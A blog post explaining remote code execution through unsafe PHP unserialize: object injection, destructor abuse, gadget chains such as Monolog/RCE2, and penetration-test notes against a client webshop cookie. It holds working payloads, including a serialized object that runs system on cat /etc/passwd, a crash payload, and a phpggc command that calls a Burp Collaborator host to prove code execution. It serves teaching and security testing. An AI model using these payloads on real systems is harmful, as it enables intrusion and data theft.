---
layout: post
title: "Remote code execution through unsafe unserialize in PHP"
thumbnail: cereal-480.jpg
date: 2021-03-03
---

<!-- photo source: https://pixabay.com/photos/cereal-spill-food-breakfast-3797538/ -->

## Serialization

In PHP, `serialize` converts a data structure such as an array or object into a string. The function `unserialize` converts a string into a data structure. This is useful to pass data structures around through a method that does not support PHP objects, but does support text. In web applications, it's often used to pass information from one page to another. In that case, serialized data may occur in a hidden form element or a cookie.

The data format is custom for PHP. Here's an example:

```php
<?php
$myObj = new stdClass();
$myObj->hello = "world";
echo serialize($myObj);
```

This outputs a piece of text that represents the contents of `$myObj`:

```
O:8:"stdClass":1:{s:5:"hello";s:5:"world";}
```

By calling `unserialize` on this text, we get the original object back.

## Vulnerabilities

The `unserialize` function is pretty complex. It has functionality to create any type of PHP object, bypassing the normal logic for this. It can handle reference loops and resource allocation. This is hard to do correctly when faced with untrusted input, and thus `unserialize` 
[is](https://bugs.php.net/bug.php?id=68942) 
[particularly](https://bugs.php.net/bug.php?id=68594)
[prone](https://bugs.php.net/bug.php?id=68710) 
[to](https://bugs.php.net/bug.php?id=68710) 
[security](https://bugs.php.net/bug.php?id=74111)
[bugs](https://bugs.php.net/bug.php?id=74103). These typically crash the PHP process, and may result in remote code execution for an attacker who's really good with buffer overflows and bypassing [ASLR](https://en.wikipedia.org/wiki/Address_space_layout_randomization).

Another class of vulnerabilities arise from the possibility to create any object, on which the destructor is called as soon as it's discarded from memory.

## Creating arbitrary objects

To get the serialized representation, the application created some valid PHP object and serialized it. However, when doing the reverse, the text representation is converted to a PHP object. PHP handles this without involving any business logic. No constructors are called. This means that if we control the text representation, we can create PHP objects that would not be possible with normal business logic flow.

In the following example, we create a user named "admin", even though that wouldn't be possible with the normal business logic.

```php
class User {
    function __construct($username) {
        if ($username == "admin") {
            throw new InvalidArgumentException($username);
        }
        $this->username = $username;
    }
}

$u = unserialize('O:4:"User":1:{s:8:"username";s:5:"admin";}');
var_dump($u);
```

This outputs:

```
object(User)#1 (1) {
  ["username"]=>
  string(5) "admin"
}
```

## Calling destructors

We used `unserialize` to create an object in the application context. As soon as the application no longer needs this object, it is cleaned up. When this happens, the destructor is called. This means we can call any destructor in the application, by creating the corresponding object. We can also determine what data that destructor acts on, since we created the object ourselves.

Suppose our user class looks like this:

```php
class User {
    function __construct($username) {
        $this->loggingFunc = 'var_dump';

        if ($username == "admin") {
            throw new InvalidArgumentException($username);
        }
        $this->username = $username;
    }

    function __destruct() {
        $func = $this->loggingFunc;
        $func("$this->username is gone");    
    }
}
```

This logs "admin is gone" once our previously created object is destroyed. But consider we happen what happens when we set `$loggingFunc` to `system` and `$username` to `cat /etc/passwd;`:

```
unserialize('O:4:"User":2:{s:11:"loggingFunc";s:6:"system";s:8:"username";s:16:"cat /etc/passwd;";}');
```

This runs `system("cat /etc/passwd; is gone");`:

```
root:*:0:0:System Administrator:/var/root:/bin/sh
daemon:*:1:1:System Services:/var/root:/usr/bin/false
_uucp:*:4:4:Unix to Unix Copy Protocol:/var/spool/uucp:/usr/sbin/uucico
_taskgated:*:13:13:Task Gate Daemon:/var/empty:/usr/bin/false
_networkd:*:24:24:Network Services:/var/networkd:/usr/bin/false
...
```

## Gadget chains

We saw that we could invoke arbitrary destructors with arbitrary data. However, often we don't know which destructors are present in application code, and destructors that directly call a user-supplied function are pretty rare. To exploit this vulnerability, we want a destructor of which we know that it runs our payload. That's where gadget chains in commonly used projects come in.

Even if we don't have the application source, it's pretty likely that the application uses Laravel, Symfony, or Zend Framework. It probably uses open-source third party components, such as Monolog for logging, or Doctrine for database access. Since these components are open source, we can take a look at the destructors and pick the destructors that are useful. For example, Zend used to have [a destructor that can remove files](https://github.com/laminas/laminas-http/blob/f490880a54896f674c8ab1ef2e3771067b104b7d/src/Response/Stream.php#L292).

Such a useful piece of code is called a *gadget*. Sometimes, the destructor does not do directly what we want, but we have to combine a few pieces to get what we want. Combining multiple pieces of code in this way is called a *gadget chain*.

Luckily, we don't have to find our own gadget chains, and there is a tool [phpggc](https://github.com/ambionics/phpggc) that knows several gadget chains and can create payloads for us.

## Example chain: Monolog/RCE2

The gadget chain Monolog/RCE2 works as follows:

* A [SyslogUdpHandler](https://github.com/Seldaek/monolog/blob/2.1.1/src/Monolog/Handler/SyslogUdpHandler.php) is created, which inherits its destructor from [Handler](https://github.com/Seldaek/monolog/blob/2.1.1/src/Monolog/Handler/Handler.php#L38-L45). This destructor calls `close()`. The `close` method on `SyslogUdpHandler` [calls]($this->socket->close();) `$this->socket->close();`.
* The `socket` property is set to an instance of `BufferHandler`. It's `close` method calls `flush` which [calls](https://github.com/Seldaek/monolog/blob/2.1.1/src/Monolog/Handler/BufferHandler.php#L92) `$this->handler->handleBatch($this->buffer);`.
* The `handler` property is set to another instance of `BufferHandler`. It extends from `Handler`, which [calls](https://github.com/Seldaek/monolog/blob/2.1.1/src/Monolog/Handler/Handler.php#L24-L29) `$this->handle()` on each record in `$this->buffer`.
* The `handle` method [calls](https://github.com/Seldaek/monolog/blob/2.1.1/src/Monolog/Handler/BufferHandler.php#L77) `processRecord` on each record.
* `processRecord` [calls](https://github.com/Seldaek/monolog/blob/2.1.1/src/Monolog/Handler/ProcessableHandlerTrait.php#L54-L61) all functions in `$this->processors` on the record. Since we control the function names in `$this->processors` and the payloads in `$this->buffer`, we can execute arbitrary PHP functions.

As you can see, calling `processRecord` with the data we want from a destructor is already quite a complex chain. It combines objects in unusual ways; normally, the `socket` attribute in `SyslogUdpHandler` contains an UDP socket object, but now we injected another type of object.

It's not straightforward to create such a gadget chain from within PHP. For example, `SyslogUdpHandler->socket` is protected, so it's not possible to set this property from outside the class. Changing this to public makes it possible to set the property, but changes the serialized representation in an incompatible way.

## Notes

* PRODUCTHISTORY cookie remembers last viewed products on webshop as a serialized PHP object. When viewing books on https://www.ebook.client.com/, the PRODUCTHISTORY cookie is unserialized to show the recently viewed books at the bottom of the page. Unserializing user input makes it possible for an attacker to construct PHP objects, call destructors with arbitrary data, and exploit vulnerabilities in PHP. This can lead to remote code execution.
* Two types of unserialize exploits: crashing the PHP executable, or running application destructor code. First tried attacking PHP. 
For example, requesting the URL https://www.ebook.client.com/product/decorating-interior gives no response at all with the following value for the PRODUCTHISTORY cookie: `O%3a8%3a"stdClass"%3a3%3a{s%3a3%3a"aaa"%3ba%3a5%3a{i%3a0%3bi%3a1%3bi%3a1%3bi%3a2%3bi%3a2%3bs%3a50%3a"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA11111111111"%3bi%3a3%3bi%3a4%3bi%3a4%3bi%3a5%3b}s%3a3%3a"aaa"%3bi%3a1%3bs%3a3%3a"ccc"%3bR%3a5%3b}'%3b`. This possibly means that the server process has crashed, something which can be used in a denial-of-service attack, or can lead to exposing memory contents or remote code execution.
* Tried several payloads from phpggc. Monolog/RCE1 and RCE2 gives 500 internal server error.
* Errors because failing to copy/paste null characters. Created urlencode on command line to bypass this.
* Ran Monolog 1.19.0 locally and unserialized my payload to figure out what is going on.
* phpggc creates objects that are normally hard to construct.
* Used `file_get_contents` against Burp collaborator server to prove RCE.

To reproduce:

* View a product. A PRODUCTHISTORY cookie is set.
* View another product. The PRODUCTHISTORY is send in the request.
* Send this request to the repeater.
* Create payload with phpggc. This payload contains null-bytes, so urlencode it directly: `./phpggc Monolog/RCE1 file_get_contents "http://tro860qcwefuih51xh3ms648czip6e.burpcollaborator.net/rce" | urlencode| pbcopy`.
* Paste payload in PRODUCTHISTORY cookie in Burp repeater.
* Result shows up in Burp collaborator client.

Payloads:

* `./phpggc Monolog/RCE1 die "test"` doesn't work. Because it's a language construct instead of a function?
* `./phpggc Monolog/RCE1 var_dump "testtesttest"` works.
* `./phpggc Monolog/RCE1 phpinfo 255` works.
* `readfile /etc/passwd` works

Original (anonymized) contents:

```
a%3A1%3A%7Bi%3A0%3Ba%3A6%3A%7Bs%3A5%3A%22image%22%3Bs%3A94%3A%22https%3A%2F%2Fwww.ebook.client.com%2Fcontents%2Ffullcontent%2F75103794%2Fcoverarts%2Fwizard%2Fsmall_75103794.jpg%22%3Bs%3A4%3A%22name%22%3Bs%3A27%3A%22decorating+with+interior%22%3Bs%3A3%3A%22url%22%3Bs%3A22%3A%22decorating-interior%22%3Bs%3A5%3A%22title%22%3Bs%3A27%3A%22decorating+with+interior%22%3Bs%3A8%3A%22subtitle%22%3Bs%3A0%3A%22%22%3Bs%3A9%3A%22productid%22%3Bs%3A2%3A%2217%22%3B%7D%7D
```
And decoded:

```
a:1:{i:0;a:6:{s:5:"image";s:94:"https://www.ebook.client.com/contents/fullcontent/75103794/coverarts/wizard/small_75103794.jpg";s:4:"name";s:27:"decorating with interior";s:3:"url";s:22:"decorating-interior";s:5:"title";O:8:"DateTime":3:{s:4:"date";s:26:"2020-06-30 13:21:09.871213";s:13:"timezone_type";i:3;s:8:"timezone";s:3:"UTC";};s:8:"subtitle";s:0:"";s:9:"productid";s:2:"17";}}
```

## Read more

* [Remote code execution via PHP Unserialize](https://notsosecure.com/remote-code-execution-via-php-unserialize/)